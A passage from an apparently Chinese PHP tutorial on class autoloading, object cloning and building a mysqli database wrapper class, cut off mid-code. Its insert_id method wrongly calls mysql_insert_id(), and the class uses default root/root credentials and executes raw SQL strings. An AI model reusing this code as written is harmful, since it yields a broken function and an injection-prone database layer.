class="comment"># 功能与__autoload()一样</span></span><br><span class="line">    <span class="variable">$c_file</span> = <span class="string">&#x27;c/&#x27;</span> . <span class="variable">$classname</span> . <span class="string">&#x27;.php&#x27;</span>;<span class="comment"># 如c/Saler.php</span></span><br><span class="line">    <span class="keyword">if</span>(file_exists(<span class="variable">$c_file</span>))&#123;</span><br><span class="line">        <span class="keyword">include_once</span> <span class="variable">$c_file</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 说明c文件夹没有对应的文件</span></span><br><span class="line">    <span class="variable">$m_file</span> = <span class="string">&#x27;m/&#x27;</span> . <span class="variable">$classname</span> . <span class="string">&#x27;.php&#x27;</span>;<span class="comment"># 如m/Saler.php</span></span><br><span class="line">    <span class="keyword">if</span>(file_exists(<span class="variable">$m_file</span>))&#123;</span><br><span class="line">        <span class="keyword">include_once</span> <span class="variable">$m_file</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 此时，上述函数永远不会自动运行，除非将函数注册到系统内部</span></span><br><span class="line">spl_autoload_register(<span class="string">&#x27;my_autoload&#x27;</span>);</span><br></pre></td></tr></table></figure><p><strong>注意</strong>：该方式其实本质就是通过两步完成了__autoload()一步的操作，但是spl_autoload_register()函数可以注册多个自定义的加载函数，更方便管理。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># c路径加载</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">c_autoload</span>(<span class="params"><span class="variable">$classname</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$c_file</span> = <span class="string">&#x27;c/&#x27;</span> . <span class="variable">$classname</span> . <span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(file_exists(<span class="variable">$c_file</span>))&#123;</span><br><span class="line">        <span class="keyword">include_once</span> <span class="variable">$c_file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># m路径加载</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">m_autoload</span>(<span class="params"><span class="variable">$classname</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$m_file</span> = <span class="string">&#x27;m/&#x27;</span> . <span class="variable">$classname</span> . <span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(file_exists(<span class="variable">$m_file</span>))&#123;</span><br><span class="line">        <span class="keyword">include_once</span> <span class="variable">$m_file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 全部注册</span></span><br><span class="line">spl_autoload_register(<span class="string">&#x27;c_autoload&#x27;</span>);</span><br><span class="line">spl_autoload_register(<span class="string">&#x27;m_autoload&#x27;</span>);    </span><br></pre></td></tr></table></figure><blockquote><p><strong>小结</strong></p></blockquote><p>1、类的使用必须先保证内存中该类存在</p><p>2、可以使用手动加载来确保类的使用安全：优点是明确，缺点是繁琐</p><p>3、可以使用自动加载来让系统按照开发者设定的路径和方式去寻找类，并尝试加载到内存</p><p>4、自动加载可以使用__autoload()函数来实现，也可以使用自定义函数+spl_autoload_register()注册共同实现（后者推荐）</p><ul><li>优点：代码简介（基本上属于一次性定义）</li><li>缺点：给人感觉不可控</li></ul><p>5、基本上所有的框架都在使用自动加载机制</p><h3 id="14、对象克隆"><a href="#14、对象克隆" class="headerlink" title="14、对象克隆"></a><strong>14、对象克隆</strong></h3><blockquote><p>目标：了解对象克隆的概念，掌握克隆魔术方法的意义</p></blockquote><blockquote><p><strong>概念</strong></p></blockquote><p><strong>克隆对象</strong>：clone，即通过已有的对象复制一个新的同样的对象，但是两者之间并非同一个对象</p><ul><li>克隆对象与原来对象内容一致（表象）</li><li>克隆出来的对象是新对象</li><li>对象克隆出来后会自动调用魔术方法__clone()（如果有该方法）</li></ul><blockquote><p>步骤</p></blockquote><p>1、定义类时考虑对象是否允许被克隆，以及允许克隆后是否需要针对克隆对象做操作</p><ul><li>不允许克隆：私有化__clone()魔术方法（不允许外部克隆，使用者一般都是外部）</li><li>允许克隆处理：在__clone()方法中设定好克隆对象的处理</li></ul><p>2、实例化对象并保存到变量</p><p>3、需要从已有对象产生新对象（不是赋值）</p><p>4、使用clone产生对象</p><blockquote><p>示例</p></blockquote><p>1、对象克隆是通过clone关键字实现，即：clone 对象;</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Saler</span></span>&#123;</span><br><span class="line">  <span class="comment"># 属性</span></span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$count</span>;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$money</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 实例化</span></span><br><span class="line"><span class="variable">$s1</span> = <span class="keyword">new</span> Saler();</span><br><span class="line"><span class="variable">$s1</span>-&gt;count = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 克隆</span></span><br><span class="line"><span class="variable">$s2</span> = <span class="keyword">clone</span> <span class="variable">$s1</span>;</span><br></pre></td></tr></table></figure><p>2、克隆出来的对象与原来对象是两个内存地址，因此是两个不同的对象</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 接上述代码</span></span><br><span class="line"><span class="variable">$s2</span>-&gt;count = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$s1</span>-&gt;count;<span class="comment"># 1，没有变化</span></span><br></pre></td></tr></table></figure><p>3、对象在实例化的时候会自动调用存在的构造方法__construct()，同样的，在类的内部，PHP允许定义一个__clone()的方法，在对象被克隆后，新克隆出来的对象会自动调用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Saler</span></span>&#123;</span><br><span class="line">  <span class="comment"># 属性</span></span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$count</span>;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$money</span>;</span><br><span class="line">    <span class="comment"># 克隆方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__clone</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        var_dump(<span class="keyword">$this</span>);<span class="comment"># 编号为2，代表是克隆出来的对象</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;count++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 实例化</span></span><br><span class="line"><span class="variable">$s1</span> = <span class="keyword">new</span> Saler();</span><br><span class="line"><span class="variable">$s1</span>-&gt;count = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 克隆</span></span><br><span class="line"><span class="variable">$s2</span> = <span class="keyword">clone</span> <span class="variable">$s1</span>;</span><br></pre></td></tr></table></figure><p>4、如果不允许对象被克隆，可以将__clone()方法私有化（本质是不允许对象在外部被克隆）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Saler</span></span>&#123;</span><br><span class="line">  <span class="comment"># 属性</span></span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$count</span>;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$money</span>;</span><br><span class="line">    <span class="comment"># 私有化克隆方法</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">__clone</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 实例化</span></span><br><span class="line"><span class="variable">$s1</span> = <span class="keyword">new</span> Saler();</span><br><span class="line"><span class="variable">$s1</span>-&gt;count = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 克隆</span></span><br><span class="line"><span class="variable">$s2</span> = <span class="keyword">clone</span> <span class="variable">$s1</span>;<span class="comment"># 致命错误：不允许对象在外部访问一个私有方法</span></span><br></pre></td></tr></table></figure><blockquote><p><strong>小结</strong></p></blockquote><p>1、对象可以通过克隆来得到新的对象（以前只有实例化）</p><p>2、克隆出来的对象会自动调用类中对应的__clone()方法（如果有）</p><p>3、因为克隆对象是新对象，不会改变原来的对象，如果需要一个和当前对象一致状态的对象，但是又不想改变当前对象的状态，那么就可以通过克隆来实现</p><p>4、可以通过私有化克隆方法来实现禁止外部对象克隆</p><h3 id="15、总结"><a href="#15、总结" class="headerlink" title="15、总结"></a>15、总结</h3><p>1、面向对象编程核心是“万物皆对象”的思想，与面向过程编程思想的本质区别是事务操作的主体：每一次操作都是由明确的对象来执行</p><p>2、面向对象思想的本质是将数据（属性）、数据操作（函数）进行的一次二次封装（类），而往后的所有操作都必须由类或者类产生的对象进行调用</p><p>3、面向对象核心关键字</p><ul><li><p>类：class，结构主体，某一类相似主体的公共部分抽离</p></li><li><p>类成员：类结构中能够直接定义的成员</p><ul><li>属性（property）：存储数据的变量</li><li>方法（method）：数据操作的逻辑</li><li>类常量（const）：存储固定数据的内部常量（const定义）</li></ul></li><li><p>实例化：new，类结构产生对象的过程</p></li><li><p>实例：instance，一个具体的对象</p></li></ul><p>4、访问修饰限定符：限定被修饰成员的方位位置（所有类成员都能被访问）</p><ul><li>public：公有，表示不限定访问区域</li><li>protected：受保护，表示限定范围为关联类内部（本质是方法内部，关联类需要学习继承）</li><li>private：私有，表示限定范围为自己类内部（内部方法内）</li></ul><p>5、类内部对象：$this</p><ul><li>普通方法内部，代表来访对象</li><li>因为在类内部，所以不论任何访问修饰限定符限定，都可以访问</li></ul><p>6、魔术方法：自动调用的方法</p><ul><li>构造方法：__construct()，对象初始化资源，对象实例化后自动调用</li><li>析构方法：__destruct()，对象销毁资源，销毁时对象自动调用</li><li>克隆方法：__clone()，对象被克隆后，克隆对象自动调用</li></ul><p>7、对象传值：对象是引用传值，不会产生新对象</p><p>8、范围解析操作符：<code>::</code>，用于类直接访问成员的符号</p><ul><li>类访问类专属成员：类常量（静态属性和静态方法）</li><li>对象也可以使用该符号访问类成员（不建议）</li></ul><p>9、静态成员：使用static关键字修饰的成员，用来给类访问的成员（对象也能访问）</p><ul><li>静态成员：静态属性和静态方法</li><li>静态成员在编译（类加载到内存）时初始化，不用产生对象即可访问（效率高）</li><li>静态属性不会出现在对象的内存空间</li></ul><p>10、self关键字：类内部用来代表类名访问类成员的</p><ul><li>self与范围解析操作符结合访问：self::类成员</li><li>self可以代替类名在类内部进行实例化：new self()</li></ul><p>11、类的加载：类的使用的前提是类在内存中必须存在</p><ul><li>手动加载：使用前写好加载路径</li><li>自动加载：在内存找不到要用的类的时候自动执行<ul><li>__autoload()函数：魔术函数，在函数内部写好加载方式</li><li>自定义函数+spl_autoload_register()函数：与魔术函数类似（建议使用）</li></ul></li></ul><p>12、对象克隆：从已有对象产生新对象</p><ul><li>防止克隆：私有化话克隆魔术方法</li></ul><p>13、多关注业务，懂得如何根据业务划分类，然后慢慢掌握类内部应该如何定义成员去解决需求问题，从而实现面向对象思想基本语法的使用</p><h3 id="16、封装数据库操作类"><a href="#16、封装数据库操作类" class="headerlink" title="16、封装数据库操作类"></a><strong>16、封装数据库操作类</strong></h3><blockquote><p>目标：理解类的封装的概念，掌握类的封装过程，掌握类成员的实际应用以及类对成员的控制关系</p></blockquote><blockquote><p><strong>概念</strong></p></blockquote><p><strong>封装数据库操作类</strong>：因为目前所使用的mysqli扩展实现数据库的操作还比较零散，如果想要高效的使用，就必须要进行二次加工</p><ul><li>在面向对象编程中，所有操作都应该是由类来实现完成</li><li>封装的完整程度是根据业务的需求来定</li></ul><blockquote><p>步骤</p></blockquote><p>1、确定要封装的业务：基于mysqli的数据库底层实现，完成数据库操作的基本诉求</p><ul><li>简化初始化操作</li><li>实现错误处理</li><li>实现增删改查</li></ul><p>2、明确封装的类的作用，确定内部实现机制</p><ul><li>方法独立性：一个方法只做一件事情</li><li>方法独立性：方法只负责执行，不对结果进行任何处理，交由外部调用处判定</li><li>灵活性：封装的所有操作应该是灵活的，不是写死的内容</li></ul><p>3、根据思路明确封装类的数据和数据操作</p><ul><li>数据使用属性保留：数据需要跨方法或者对外提供数据支持<ul><li>数据库操作的数据：主机地址、端口、用户名、密码、数据库名字、字符集</li><li>数据库连接资源跨方法：连接资源</li><li>错误信息对外数据支持：错误信息、错误编号</li></ul></li><li>数据操作具体功能<ul><li>初始化资源工作：构造方法，实现属性初始化</li><li>初始化数据库资源：实现数据库的连接认证、字符集设置和数据库选择：失败返回false并记录错误</li><li>SQL指令语法检查：SQL执行并完成错误处理：失败返回false并记录错误</li><li>写操作：实现增伤改指令的执行：调用SQL指令语法检查，成功返回受影响行数</li><li>自增长ID获取：实现自增长id获取</li><li>读操作：单记录获取和多记录获取：调用SQL指令语法检查</li></ul></li></ul><p>4、确定类的控制</p><ul><li>不需要外部访问和使用的私有</li><li>明确外部需要用到的公有</li><li>如果数据安全性要求高，那么可以属性私有，但是允许对外提供可以操作的公有方法（内部安全处理）</li></ul><blockquote><p>示例</p></blockquote><p>1、一个类通常就是一个文件，所以要先确定文件的名字：通常类文件命名规范有两种</p><ul><li>文件名字与类名字一样，如Sql.php</li><li>为了区分普通PHP文件，增加中间类描述，如Sql.class.php</li><li>现在PHP几乎都是面向对象编程，所以通常采用第一种方式：因此当前命名数据类的文件为：Sql.php</li></ul><p>2、确定类文件名字后其实也就确定了类名字，因此可以创建一个Sql类</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 数据库操作类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sql</span></span>&#123;&#125;</span><br></pre></td></tr></table></figure><p>3、类的创建分两种：一是特定使用，即类里面的所有内容只为某次使用；二是通用，即工具类，以后很多地方可以用。</p><ul><li>特定使用，功能可以不用太灵活</li><li>通用工具，功能应该大众化，数据的变化会比较多</li></ul><p><strong>数据库类</strong>以后凡是要操作数据库的地方都可以用得到，很多项目都会用到，所以应该是个通用工具类，因此要考虑其到处可用的特性，让其能够灵活</p><p>4、数据库的操作最基本的特性不会改变：即需要连接认证，而连接认证的信息是灵活的，所以可以通过设定属性来控制，这些信息也都是不同使用者不同的，应该可以改变，所以可以通过构造方法来实现数据传入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 数据库操作类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sql</span></span>&#123;</span><br><span class="line"><span class="comment"># 设置属性：数据库初始化信息</span></span><br><span class="line"><span class="keyword">public</span> <span class="variable">$host</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$port</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$user</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$pass</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$dbname</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$charset</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 构造方法初始化数据：数据较多，应该使用数组来传递数据，关联数组，而且绝大部分的开发者本意是用来测试，所以基本都是本地，因此可以给默认数据</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    $info = array(</span></span><br><span class="line"><span class="comment">    &#x27;host&#x27; =&gt; &#x27;localhost&#x27;,</span></span><br><span class="line"><span class="comment">    &#x27;port&#x27; =&gt; &#x27;3306&#x27;,</span></span><br><span class="line"><span class="comment">    &#x27;user&#x27; =&gt; &#x27;root&#x27;,</span></span><br><span class="line"><span class="comment">    &#x27;pass&#x27; =&gt; &#x27;root&#x27;,</span></span><br><span class="line"><span class="comment">    &#x27;dbname&#x27; =&gt; &#x27;blog&#x27;,</span></span><br><span class="line"><span class="comment">    &#x27;charset&#x27; =&gt; &#x27;utf8&#x27;</span></span><br><span class="line"><span class="comment">    )</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$info</span> = <span class="keyword">array</span>(<span class="params"></span>)</span>)</span>&#123;</span><br><span class="line">        <span class="comment"># 初始化：确保用户传入了数据，否则使用默认值</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;host = <span class="variable">$info</span>[<span class="string">&#x27;host&#x27;</span>] ?? <span class="string">&#x27;localhost&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;port = <span class="variable">$info</span>[<span class="string">&#x27;port&#x27;</span>] ?? <span class="string">&#x27;3306&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;user = <span class="variable">$info</span>[<span class="string">&#x27;user&#x27;</span>] ?? <span class="string">&#x27;root&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;pass = <span class="variable">$info</span>[<span class="string">&#x27;pass&#x27;</span>] ?? <span class="string">&#x27;root&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;dbname = <span class="variable">$info</span>[<span class="string">&#x27;dbname&#x27;</span>] ?? <span class="string">&#x27;test&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;charset = <span class="variable">$info</span>[<span class="string">&#x27;charset&#x27;</span>] ?? <span class="string">&#x27;utf8&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>注意</strong>：方法设定的原则是一个方法只实现一个简单的功能，不要多个功能堆积到一个方法中。</p><p>5、数据库属性会在实例化Sql对象的时候自动初始化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 接上述代码（类外测试）</span></span><br><span class="line"><span class="variable">$s1</span> = <span class="keyword">new</span> Sql();<span class="comment"># 使用默认数据库信息</span></span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;host&#x27;</span> =&gt; <span class="string">&#x27;192.168.0.1&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;user&#x27;</span> =&gt; <span class="string">&#x27;admin&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;pass&#x27;</span> =&gt; <span class="string">&#x27;admin&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;dbname&#x27;</span> =&gt; <span class="string">&#x27;Taobao&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="variable">$s2</span> = <span class="keyword">new</span> Sql(<span class="variable">$db</span>);<span class="comment"># 使用外部数据库信息</span></span><br></pre></td></tr></table></figure><p>6、数据库要操作的第一件事就是连接认证，所以需要一个连接认证的功能。这里可以使用mysqli面向过程的方法。但是需要建立一个方法来实现连接认证：连接是否成功？</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 对外提供属性，记录错误数据（外部如何处理，不需要我们管）</span></span><br><span class="line"><span class="keyword">public</span> <span class="variable">$errno</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$error</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># mysqli的连接资源对象是任何mysqli扩展操作的基础，因此需要该连接对象能够在其他方法中使用：属性处理</span></span><br><span class="line"><span class="keyword">public</span> <span class="variable">$link</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在上述类中增加一个方法：实现连接认证功能</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">connect</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="comment"># 利用属性可以跨方法访问：5个参数分别为：主机、用户名、密码、数据库、端口</span></span><br><span class="line">    <span class="comment"># 利用错误抑制符抑制可能出现的错误</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;link = @mysqli_connect(<span class="keyword">$this</span>-&gt;host,<span class="keyword">$this</span>-&gt;user,<span class="keyword">$this</span>-&gt;pass,<span class="keyword">$this</span>-&gt;dbname,<span class="keyword">$this</span>-&gt;port);</span><br><span class="line">    <span class="comment"># 判定连接是否成功</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;link)&#123;</span><br><span class="line">        <span class="comment"># 将错误信息保存到记录错误的属性中，返回false</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;errno = mysqli_connect_errno();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;error = mysqli_connect_error();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 返回一个连接结果：不需要返回资源对象，为真即可表示成功</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>7、连接认证包括数据库选择设定好后，此时还存在一个细节问题：字符集，为了保证数据库连接的正常操作，需要新增一个方法设定字符集</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在Sql类中增加设定字符集的方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">charset</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment"># 调用mysqli的设置字符集的函数</span></span><br><span class="line">    <span class="variable">$res</span> = mysqli_set_charset(<span class="keyword">$this</span>-&gt;link,<span class="keyword">$this</span>-&gt;charset);</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 判定是否成功</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$res</span>)&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;errno = mysqli_errno(<span class="keyword">$this</span>-&gt;link);</span><br><span class="line"><span class="keyword">$this</span>-&gt;error = mysqli_error(<span class="keyword">$this</span>-&gt;link);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>8、初始化完成后，可以实现具体的业务处理：所有的SQL都需要使用mysqli_query执行，也都可能产生错误，因此封装一个专门执行SQL并检查错误的方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># SQL执行以及错误检查</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$sql</span></span>)</span>&#123;</span><br><span class="line"><span class="comment"># 执行SQL</span></span><br><span class="line"><span class="variable">$res</span> = mysqli_query(<span class="keyword">$this</span>-&gt;link,<span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 判定结果</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$res</span>)&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;errno = mysqli_errno(<span class="keyword">$this</span>-&gt;link);</span><br><span class="line"><span class="keyword">$this</span>-&gt;error = mysqli_error(<span class="keyword">$this</span>-&gt;link);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 返回正确结果</span></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>9、上述功能本质也可以是一个写操作（不完整），但是写操作是有业务性的：返回受影响的行数，因此独立增加一个写操作方法，调用上述方法实现，并根据结果返回受影响的行数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 写操作</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$sql</span></span>)</span>&#123;</span><br><span class="line"><span class="comment"># 调用方法检查执行</span></span><br><span class="line"><span class="variable">$res</span> = <span class="keyword">$this</span>-&gt;check(<span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 判定执行结果：成功返回受影响的行数，失败返回false，错误已经在check方法中记录</span></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$res</span> ? mysqli_affected_rows(<span class="keyword">$this</span>-&gt;link) : <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>10、写操作中可能会有新增需求，因此也对外提供一个获取自增长Id的方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 自增长id</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insert_id</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> mysql_insert_id(<span class="keyword">$this</span>-&gt;link);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>11、读取操作：读取一条记录（利用check进行SQL执行和错误检查）：读取一条数据可能需要获取当前查询结果的列数，增加属性保留</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 属性：记录查询结果中的列数</span></span><br><span class="line"><span class="keyword">public</span> <span class="variable">$columns</span> = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 读操作</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">read_one</span>(<span class="params"><span class="variable">$sql</span></span>)</span>&#123;</span><br><span 